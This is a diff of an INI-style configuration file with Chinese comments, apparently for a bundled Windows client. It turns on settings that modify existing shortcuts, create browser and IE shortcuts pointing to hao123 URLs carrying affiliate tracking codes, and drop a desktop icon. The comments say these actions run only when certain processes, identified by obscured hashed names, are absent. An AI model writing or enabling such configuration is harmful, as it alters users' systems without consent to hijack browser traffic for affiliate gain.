@@ -1,21 +1,29 @@
+;修改快捷方式
 [msc]
-switch=0
+switch=1
 time=10
 url=http://www.hao123.com/?tn=99488468_hao_pg
+;创建默认浏览器快捷方式
 [csc]
-switch=0
+switch=1
 time=10
 url=http://www.hao123.com/?tn=94990411_hao_pg
+;创建IE快捷方式
 [cscie]
-switch=0
+switch=1
 time=10
 url=http://www.hao123.com/?tn=92299467_hao_pg
+;丢一个图标到桌面
 [item]
 cycle=30
-switch=0
+switch=1
 url=http://www.baidu.com
 name=快快快快快快快看
 ico=http://cloud.xmp.kankan.com/cloud/kkxzweb_v1.3.ico
+;cnt有多少个条件就写几个
+;pand 表示必须2个进程都不存在才执行（这里配置的都是进程不存在的意思）
+;por 表示任意一个进程不存在才执行
+;每个条件里都只取一个进程条件，优先取pand,如果一个都没有，表示没有进程限制
 [condcnt]
 cnt=5
 [cond1]
@@ -28,5 +36,4 @@ task=2
 pand=9oS4HGsIaOXBxV4OLDF_xw
 task=3
 [cond5]
-por=W0lxVU7z7lx96rCa33CGww
 task=4
